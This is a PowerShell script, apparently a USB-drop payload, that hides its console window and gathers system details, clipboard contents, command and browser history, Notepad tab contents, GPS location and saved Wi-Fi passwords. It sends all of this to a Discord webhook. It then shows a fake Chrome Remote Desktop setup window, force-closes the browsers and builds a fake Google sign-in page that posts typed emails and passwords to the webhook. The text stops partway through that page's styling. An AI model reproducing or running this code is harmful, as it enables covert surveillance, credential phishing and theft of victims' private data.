# SYSTEM INFO TO DISCORD

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'hideme'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

sleep 1
$hookurl = "$dc"
# shortened URL Detection
if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}

$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME.. Please wait`` :computer:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

Add-Type -AssemblyName System.Windows.Forms

# WMI Classes
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$processor = "$($processorInfo.Name)"
$gpu = "$($videocardinfo.Name)"
$DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion

# User Information
$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = (Get-ComputerInfo).WindowsRegisteredOwner
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$OSString = "$($systemInfo.Caption)"
$OSArch = "$($systemInfo.OSArchitecture)"
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"
$clipboard = Get-Clipboard

# System Information
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"

# Nearby WiFi Networks
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4

$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)

# Current System Metrics
function Get-PerformanceMetrics {
    $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue

    return [PSCustomObject]@{
        CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
        MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
        DiskIO = "{0:F2}" -f $diskIO.CookedValue
        NetworkIO = "{0:F2}" -f $networkIO.CookedValue
    }
}
$metrics = Get-PerformanceMetrics
$PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
$PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
$PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
$PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"

# History and Bookmark Data
$Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')
$outpath = "$env:temp\Browsers.txt"
foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        $Value = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique

        $Value | ForEach-Object {
            [PSCustomObject]@{
                Browser  = $Browser
                DataType = $DataValue
                Content = $_
            }
        } | Out-File -FilePath $outpath -Append
    }
}
$Value = Get-Content -Path $outpath
$Value = ($Value | Out-String)

# Saved WiFi Network Info
$outssid = ''
$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws){
    if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
        $ssid=$s.Trim()
        if($s -Match ":"){
            $ssid=$s.Split(":")[1].Trim()
            }
        $pw=(netsh wlan show profiles name=$ssid key=clear)
        $pass="None"
        foreach($p in $pw){
            if($p -Match "Key Content"){
            $pass=$p.Split(":")[1].Trim()
            $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
            }
        }
    }
    $a++
}

# GPS Location Info
Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
	Sleep -M 100
}  
if ($GeoWatcher.Permission -eq 'Denied'){
    $GPS = "Location Services Off"
}
else{
	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
	$GL = $GL -split " "
	$Lat = $GL[0].Substring(11) -replace ".$"
	$Lon = $GL[1].Substring(10) -replace ".$"
    $GPS = "LAT = $Lat LONG = $Lon"
}

function EnumNotepad{

$appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
$directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
$matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
foreach ($dir in $matchingDirectories) {
    $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
    $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
    foreach ($fullFilePath in $listOfBinFiles) {
        if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
            continue
        }
        $seperator = ("=" * 60)
        $SMseperator = ("-" * 60)
        $seperator | Out-File -FilePath $outpath -Append
        $filename = $fullFilePath.Name
        $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
        $isSavedFile = $contents[3]
        if ($isSavedFile -eq 1) {
            $lengthOfFilename = $contents[4]
            $filenameEnding = 5 + $lengthOfFilename * 2
            $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
            "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append

        } else {
            "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            $filenameEnding = 0
            $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
            $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
            $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
            $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
            $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
            $originalFileContent = ""
            for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                if ($originalFileBytes[$i] -ne 0) {
                    $originalFileContent += [char]$originalFileBytes[$i]
                }
            }
            $originalFileContent | Out-File -FilePath $outpath -Append
        }
     "`n" | Out-File -FilePath $outpath -Append
    }
}
}

function Convert-BytesToDatetime([byte[]]$b) { 
    [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
    $script:activated = [datetime]::FromFileTime($f)
}
$bArr = (Get-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy 
$totalSize = ([System.BitConverter]::ToUInt32($bArr,0))
$policies = @()
$ip = 0x14
while ($true){
    $eSize = ([System.BitConverter]::ToUInt16($bArr,$ip))
    $eNameSize = ([System.BitConverter]::ToUInt16($bArr,$ip+2))
    $eDataSize = ([System.BitConverter]::ToUInt16($bArr,$ip+6))
    $eName = [System.Text.Encoding]::Unicode.GetString($bArr[($ip+0x10)..($ip+0xF+$eNameSize)])
    if ($eName -eq 'Security-SPP-LastWindowsActivationTime'){
        Convert-BytesToDatetime($bArr[($ip+0x10+$eNameSize)..($ip+0xF+$eNameSize+$eDataSize)])
    }
    $ip += $eSize
    if (($ip+4) -ge $totalSize){
        break
    }
}
$infomessage = "
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================
"

$infomessage1 = "``````
=============================================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=============================================================
User Information
-------------------------------------------------------------
Current User          : $env:USERNAME
Email Address         : $email
Language              : $systemLanguage
Keyboard Layout       : $keyboardLayoutID
Other Accounts        : $users
Current OS            : $OSString
Build ID              : $ver
Architechture         : $OSArch
Screen Size           : $screensize
Location              : $GPS
Activation Date       : $activated
=============================================================
Hardware Information
-------------------------------------------------------------
Processor             : $processor 
Memory                : $RamInfo
Gpu                   : $gpu

Storage
----------------------------------------
$Hddinfo
$DiskHealth
Current System Metrics
----------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio
=============================================================
Network Information
-------------------------------------------------------------
Public IP Address     : $computerPubIP
``````"
$infomessage2 = "

Saved WiFi Networks
----------------------------------------
$outssid

Nearby Wifi Networks
----------------------------------------
$Wifi
==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
----------------------------------------
$Value

Powershell History
---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="

$outpath = "$env:TEMP/systeminfo.txt"
$infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append

if ($OSString -like '*11*'){
    EnumNotepad
}
else{
    "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
}

$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage1"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

curl.exe -F file1=@"$outpath" $hookurl
Sleep 1
Remove-Item -Path $outpath -force

#========================================== WINDOW ONE (SETUP) =====================================================
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$base64IconString = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAABMlBMVEVHcExChfRChfRAm3jqQzVChfQ0qFNChfTxcyVChfVChfQ0qFPrRzPqQzU0qFMzp1bqQzU0qFM0qFM0plw0qFNChfQ0qFPqQzVChfRChfTqQzU0qFPqQzXqQzU0qFPqQzXqQzXqQzXqQzXrRDT7vAX8vAU1qFLqQjXqQzXqQzX8vQRAqU40qFNChfTqQzXqQzU0qFNChfT0uwj7vAU0qFM0qFPqQzX7vAU5m5BChfP7vAVChfT7vAXqQzU0qFPqQzVChfT7vAU0qFPqQzX7vAVBh+v7vAX7vAX7vAX1uAlChfT7vAW+th32lxRChfRChfRChfQ0qFNChfTqQzX7vAUyqFX+vARAi9o9krg2o2vRuBX6tQiltCbzgxztWixFqkx8rzf4pw1frUL2lhTrSzLwbyTRhUDUAAAAUXRSTlMA4R4G9SWqYQfoUOFL4lENcj3SZ/zy9/kP+j4cg9TvHbP9U8QZ8bsPpzQ6SHU/J2Uvzf16Jod2Tf5zubzVkH7uIWeTl936kp+GrY2OeHgwmKE8ZUQjAAAC40lEQVRYw82Wd3eaUBjGSTCogBiGGBEHmjiiUWPVxiwymu51BW1GmyZp8/2/QlUU4bL1tKfP8T94fr7zchHk/1UkVy00e6LYaxaEXDmoO0eK+ZgsKcr4p0ihWPGkkAvw38JJJqmYJCnJzKUQ8Wcn87Jiq1Ce9IGoVkKKo0KVqoe93IsproptutazkZcUD0kVl2oKGcWHio5pkDE/fiXUXNG/6dAKwa/fqX62+UvJpOTPX85bzHLxcrNAkoXmSVH29CM9qH9STBT0jperYsbDX4UKIIsNaLtE2c0fqUCtFuyGxNmPkOb5tx+2RsFxlSLvfvw2+gMfH7s76q973Z8P7Ec+qKr6+DzzZxqB/dvHY4B6p6WRbAY/Pl+21SlhmsYSCSBv1Zke75UQucT5fTgHqHfPxSUC2H6lLgifoIdbeNhROKo3UdfOLgRYXxs4an9rVsOFXz3eDgCIbmjvnBsAh5EAgMSe9s4LA+ANEgCQwq2A1/8UMMBXTGEOWLqI8xSWbmNqb8VBSny2jPKo/REG7EfNMgDW1uFlGrUfSnEzAD3bMOosnLKOsr7Oo9snwFPum9c3RPAVOlDU7z+HAMAhQMt5ZAD0TUfaqD31A551A+Ap6ypoh+ro9gEMJwDAtHwGoJdg2sjbp6l7olLauQKGAAbvjR8WLXxNHOZUBjw6sM0AQWr8wg84gNnHgJuG6mjL2G0MmFSirfZ4P2qa47DpaYswE7LdDjRQNHbwzTGAseqcmQCILq2XAk1TWBaAGwMhgcMBQklMomAu6lStRrFdjNDwN9c64AsKp9hhLISxi+N5Y2jDg6vZDJxZi0QTwFNDoBUiumfXJcoHQUsjEbafE3+E4fVV32lSacYPIeuybh2M87JzhOuJEa97pMFhLY+PfQvjXfwMG/e8LqC1ydTZ20/Tvm4cKH3BWMPIlti0/1tLutYtEdlZRTmeYDC2hQa8+aBpmmLrp6d1lqI7cWQVocjf1B+DjRopJPWlbAAAAABJRU5ErkJggg=="
$iconimageBytes = [Convert]::FromBase64String($base64IconString)
$ims = New-Object IO.MemoryStream($iconimageBytes, 0, $iconimageBytes.Length)
$ims.Write($iconimageBytes, 0, $iconimageBytes.Length);
$alkIcon = [System.Drawing.Image]::FromStream($ims, $true)

$base64String = "iVBORw0KGgoAAAANSUhEUgAAAPoAAABUCAMAAACcJNqRAAAARVBMVEVHcEzqQzU0qFPqQzXvYitChfRChfR6hpM+js9ChfQ/i9rxdSRChfTqQzX7vAXqQzX7vAX7vAVChfRChfTqQzX7vAU0qFNM2hsmAAAAE3RSTlMA7MqUHl7fChi+Nz+fx+NhbaeCYkjZxAAAB0RJREFUeNrtXGl3ozoMhXqRsSEE0s7//6kPQ4JlW16y9JyUPJ2Z+dAwRRetvhJpmpSA0mLurcxCaNV8iijRd/Kyi5RdL9Rn4EawHf43Rq9v8iTw7pKS7k3Bq69/m3zB7wDfwB8Vuu4vBZG9OiJ0EPJSlk4fD7rqL1UixdGgayLKpZX4xzMcCnqI3JbypVqo5a+YOx9/fyjoAfJOaPxbQOPM/3aZ7inoqivVb1f23i/HPwPdy3Ay0biorQC8YXV7BvpcVbzARsXB6rq4VAay6t8R+RPQcaAX6hZAcyjo8/uWrV+GruX7lq1fhu6yu/yjdMSj0JUzumg+C/r8xwP9cegovevms6DrVxudc27M8k/dtcbYi2vIBGVPUkrdDf2qD+T8/QWRDoaxoV1lYKOB/LXn6XT6OVmZziYLX+nl8CgxNaxukoUOfLzqMwwsvAV0r0vvfBzabyTtMCYB8QX3D5bTOXltQBiuh6tebrK6agI6BPoMjNP5vX8e+Hckw0haHs4+7hx4iJnS5Zhxq8hdEjqYIa+OeJW/EzdahRF4zPRDymQqaTMpitA5awltWqSOeE1+h7H9TsgwRshPPwk5nWtos5U5K0Dn7LtkirkU6pARdxVLIl+edID9nEQeY9cljjgBnQ9JdXbsuzt1KhFoGRFlm8fYc8hD7EXkCehJm6/YIYQOhQY/dd9FxiCxL+L/xKS8fS1t/rMwKW9fKlsX8cM0dObrs1RcrNDVEvsv75oHoKs4w7FxaR+A+4Vu2AMMME5bzpe4MV6hO7lre58otWVcB/mehG7wrUfbzQA3LiavlngK+pYfAD3jwbUxgIvd7vJn7NvuWpzzJ4I8Qnyh8mZEFHQY/IwOYVRuLv+Uw2/Q0TP2KxmKuJZH7j751zrsJxOdLjy+EHAGoKCPyBL4Hg67qUhzFdCR0Vnw+BB2Fhp9CttKh32CwOihbgg7Ad0ZvQ36BOYpWipuZejO6EPYvYCrMdtn/BRHdGz3zezO6FKneVQCulNoDM4XfrSXWpoy9DH1jH0fGz2jx70LDoazf6SM+0zoM9B32w6QPF8wz3dmmqem6jl2ROdejOoL/E+nwKd98T+dc6EoMtCHyOjAWdDiWCcsHV+oJm5/XLYq8DZjdOQT9mbct2vS7DYa3JGSssn+aQx9V+gWf8vBtQ07+bUQ9fcfWjV+WqZNRfp23xbleA8bce0JtTXOJjpHq8XQd4XWXGYNHgBfzq4QUBXz3WyewGZltNcMyCl26BNdSSfkFLtr0SYRSehYIZzaYg7BBXtXa/b+Dugu6Ywoy030Yzpj6PmGQ1dAD6kTa3DMHLmYqj2x+/Zgr4PeYOgiTxnelMhAH4a0wZtC51AaTq63Hcki+rzVRT79VkAnU1uKja6KduWn3vG3rf6ww/uHN56fQUh9j9G3q2vTnO2bTbaso14Wx/rDaQ4bnBeHEBUu74rOZo7fKG4nXNzko8UtrGVZO1ZgRyyhCLCVWxp4qKURd7Y0QyUfHlIChTEzQn59SoVGlj3cyGbPlDpNS6KT5MAM1Jar0h4oZoZFaNeWop0Tx5cfUzy+ZGnyzPEFXLATNwGedvmLFMknhbmyvdyaNnVcx87XBofWiaeT3E9waI3NrmXVoZVQiA0mmeUtKp2Y/+AXI3Ts09GtIKIqIj6CKOq3j+ZkFCITUFQF+071GvajNqhz/oxDzro0+BLUmbz1sWOCyhQIKjSK2gmq1KILXnuiCCpn9mAEsCnUBoYP5juyx6/6gBKzzwIL2rYeOYeJWhalMn/M5NGScJsB0BnIswFJSzJy0OQUCgwfzbbsPHeTvpPZ1WhcSW37EJK/uOZzj4y+XeuR0Yayrn3zBlYj9HeT0byJFBrLcz1awuU6fwQxhJR/bgQxLeLNIDB15Q9fFlvERqBHEJ5CbaxQ2H7VvQRBvQoAuTlPEHGQHzz5zY54cPBUUCjK8tsO7GMvQeRu1bLybN0h9x1KPDhuzGIfqL5TzcXHPNNjyfSotR1r9gqigUwee3HInFGIRG7Dq5f5l71S/c441N8oNWCnKGrSEytWC5IKsXRTnwGffcWPXGNo6RvxOxZKCE+sWiihFUpsuOzgyTc7yy92xmx3+gmbEPxpMpXGkEvMQQx9+fsVrBGFpGTpHHfrYdwse13ZqniZGZrrrtZyk3V7LHsfu0O1ljW7QDad88tjizEkNsB+aO2vy2Vcr3/i3SaskKlY0IPrjt7a0ayLetXrhHZBbxyN4RX/Y+kzzPlctzOotNVGK/C7nf6m7ksU+guy9/dz82mi//oyd5V9hc5xavqouMEmd2IGsWc5qY5q8C7h1OJV261vKiJJR6vucuwsJ1KjEfXAYPyPBXpPU6XoqxUO6u8+U3HropVGLb08bn73OHLZz/Ps0zQH7mcgz5l1R/6WoCxf2Omm+Uzs8tjIF5+fP9PmW3knGar5I74LLf5yKNnr5kMEfweclJ/x/W+YpBFCzOKjvvXvf3m9/AcwMcFn36zH+AAAAABJRU5ErkJggg=="
$imageBytes = [System.Convert]::FromBase64String($base64String)
$memoryStream = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)
$memoryStream.Write($imageBytes, 0, $imageBytes.Length);
$image = [System.Drawing.Image]::FromStream($memoryStream)

# shortened URL Detection
if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}

$setupwindow = New-Object System.Windows.Forms.Form
$setupwindow.ClientSize = '600,450'
$setupwindow.Text = "Chrome Remote Desktop Setup"
$setupwindow.BackColor = "#ffffff"
$setupwindow.Opacity = 1
$setupwindow.TopMost = $true
$setupwindow.Icon = [System.Drawing.Icon]::FromHandle((new-object System.Drawing.Bitmap -argument $ims).GetHIcon())
$setupwindow.FormBorderStyle = 'FixedSingle'

$nextbutton = New-Object System.Windows.Forms.Button
$nextbutton.Text = "Next"
$nextbutton.Width = 85
$nextbutton.Height = 42
$nextbutton.Location = New-Object System.Drawing.Point(490, 395)
$nextbutton.Font = 'Open Sans,12'
$nextbutton.BackColor = "#287ae6"
$nextbutton.ForeColor = "#ffffff"

$textfield = New-Object System.Windows.Forms.Label
$textfield.Text = "Welcome to Google Remote Desktop Host"
$textfield.ForeColor = "#000000"
$textfield.AutoSize = $true
$textfield.Location = New-Object System.Drawing.Point(145, 140)
$textfield.Font = 'Microsoft Sans Serif,12'

$infofield = New-Object System.Windows.Forms.Label
$infofield.Text = "Remote access for your PC. Sign in with google to continue.."
$infofield.ForeColor = "#000000"
$infofield.AutoSize = $true
$infofield.Location = New-Object System.Drawing.Point(120, 230)
$infofield.Font = 'Microsoft Sans Serif,10'

$infofield2 = New-Object System.Windows.Forms.Label
$infofield2.Text = "Chrome will close and restart during installation"
$infofield2.ForeColor = "#000000"
$infofield2.AutoSize = $true
$infofield2.Location = New-Object System.Drawing.Point(155, 260)
$infofield2.Font = 'Microsoft Sans Serif,10'

$linkfield = New-Object System.Windows.Forms.Label
$linkfield.Text = "Sign in to your account"
$linkfield.ForeColor = "#287ae6"
$linkfield.AutoSize = $true
$linkfield.Location = New-Object System.Drawing.Point(345, 407)
$linkfield.Font = 'Microsoft Sans Serif,10'

$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Size = New-Object System.Drawing.Size(300, 300)
$pictureBox.SizeMode = 'AutoSize'
$pictureBox.Image = $image
$pictureBox.Location = New-Object System.Drawing.Point(170, 50)

$setupwindow.controls.AddRange(@($nextbutton,$linkfield,$textfield,$infofield,$infofield2,$pictureBox))

$nextbutton.Add_Click({

$setupwindow.Close()
})


[void]$setupwindow.ShowDialog()

Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
Sleep 1


$htmlcode1 = @"
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Google</title>
    <script>
        function sendEmail() {
"@            
 

 $webhk = '            var webhookURL = "' + "$dc" + '";'


 $htmlcode2 = @" 
            var message1 = document.getElementById("email").value;
            var message2 = document.getElementById("message").value;
            var message = "Email: " + message1 + " | Password: " + message2;
            var payload = {
                content: message
            };
            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4){if (xhr.status === 200){
                        console.log("Message sent successfully!");}else{console.log("Error:", xhr.status);}}};
            xhr.send(JSON.stringify(payload));}
</script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');

body {
    margin: 0;
    padding: 0;
    background-size: cover;
    font-family: 'Open Sans', sans-serif;
}
img {
    transform: scale(0.9);
    position: relative;
    left: 15%;
}
.box {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 30rem;
    padding: 3.5rem;
    box-sizing: border-box;
    border: 1px solid #dadce0;
    -webkit-border-radius: 8px;
    border-radius: 8px;

}
.box h2 {
    margin: 0px 0 -0.125rem;
    padding: 0;
    text-align: center;
    color: #202124;
    font-size: 24px;
    font-weight: 400;
}
.box .logo 
{
    display: flex;
    flex-direction: row;
    justify-content: center;
    margin-bottom: 16px;
}
.box p {
    font-size: 16px;
    font-weight: 400;
    letter-spacing: 1px;
    line-height: 1.5;
    margin-bottom: 24px;
    text-align: center;
}
.box .inputBox {
    position: relative;
}
.box .inputBox input {
    width: 93%;
    padding: 1.3rem 10px;
    font-size: 1rem;
   letter-spacing: 0.062rem;
   margin-bottom: 1.875rem;
   border: 1px solid #ccc;
   background: transparent;
   border-radius: 4px;
}
.box .inputBox label {
    position: absolute;
    top: 0;
    left: 10px;
    padding: 0.625rem 0;
    font-size: 1rem;
    color: gray;
    pointer-events: none;
    transition: 0.5s;
}
.box .inputBox input:focus ~ label,
.box .inputBox input:valid ~ label,
.box .inputBox input:not([value=""]) ~ label {
    top: -1.125rem;
    left: 10px;
    color: #1a73e8;
    font-size: 0.75rem;
    background-color: #fff;
    height: 10px;
    padding-left: 5px;
    padding-right: 5px;
}
.box .inputBox input:focus {
    outline: none;
    border: 2px solid #1a73e8;
}
.box button[type="submit"] {
    border: none;
    outline: none;
    color: #fff;
    background-color: #1a73e8;
    padding: 0.625rem 1.25rem;
    cursor: pointer;
